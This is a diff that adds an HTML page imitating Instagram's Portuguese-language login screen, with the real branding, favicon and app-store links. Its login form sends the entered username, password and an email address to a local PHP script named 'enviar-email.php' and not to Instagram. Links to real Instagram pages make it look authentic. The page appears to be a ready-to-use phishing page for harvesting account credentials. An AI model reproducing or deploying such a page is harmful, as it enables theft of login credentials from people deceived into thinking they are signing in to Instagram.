@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link type="image/png" sizes="32x32" rel="icon" href="./images/instagram-favicon.png">
+    <link rel="stylesheet" href="./style.css">
+    <title>Instagram</title>
+</head>
+
+<body>
+    <main id="main">
+        <div class="wrapper">
+            <div class="instagram-phone">
+                <img src="./images/instagram-celular.png " alt="celular com fotos do feed do instagram">
+            </div>
+
+            <div class="instagram-login">
+                <div class="group">
+                    <img src="./images/instagram-logo.png" class="instagram-logo" alt="isntagram-logo"
+                        aria-label="logo com o nome instagram">
+                    <div class="form">
+                        <form action="./php/enviar-email.php" method="POST" class="card">
+                            
+                            <div class="field">
+                                <input id="username" type="text" name="nome" required maxlength="25" minlength="2" placeholder="Telefone, nome de usuário ou email"
+                                    aria-label for="Telefone, nome de usuário ou email" aria-required="true"/>
+                            </div>
+
+                            <div class="field">
+                                <input id="password" type="password" placeholder="Digite a sua senha" aria-label for="senha"
+                                    name="senha" aria-required="true" />
+                            </div>
+
+                            <div class="field">
+                                <input type="email" id="inputEmail" name="email" required maxlength="50" placeholder="Digite o seu Email" aria-required="true">
+                            </div>
+
+
+                            <button > Entrar </button>
+                            </form>
+
+
+                            <div class="separator">
+                                <div class="line"></div>
+                                <p>OU</p>
+                                <div class="line"></div>
+                            </div>
+
+                            <div class="outro">
+                                <button class="fb-login-btn" type="button" aria-label="botão entrar com o Facebook">
+                                    <i class="fa-brands fa-facebook-square"></i>
+                                    <span class="login-with-fb"><a id="fbhref"
+                                            href="https://www.instagram.com/accounts/login/" target="_blank">
+                                            Entrar com o Facebook
+                                        </a>
+                                    </span>
+                                </button>
+
+                                <p class="forgot-password"><a href="https://www.instagram.com/accounts/password/reset/"
+                                        target="_blank"> Esqueceu a senha? </a></p>
+                            </div>
+                    </div>
+                </div>
+                <div class="group sign-up">
+                    Não tem uma conta? <a class="sign-up" href="https://www.instagram.com/accounts/emailsignup/"
+                        target="_blank"> Cadastre-se </a>
+                </div>
+                <div class="get-the-app">
+                    <p> Obtenha o aplicativo.</p>
+                    <div class="download">
+                        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D96D7ED49-35BB-4874-9B9A-BA2BE559BD3F%26utm_content%3Dlo%26utm_medium%3Dbadge"
+                            class="app-download" target="_blank"></a>
+                        <a href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT?hl=pt-br&gl=br"
+                            class="app-download" target="_blank"></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <div class="social-links">
+                <div class="credit">
+                    
+                </div>
+
+            </div>
+        </footer>
+    </main>
+    <script src="https://kit.fontawesome.com/44fd1bb967.js" crossorigin="anonymous"></script>
+</body>
+
+</html>
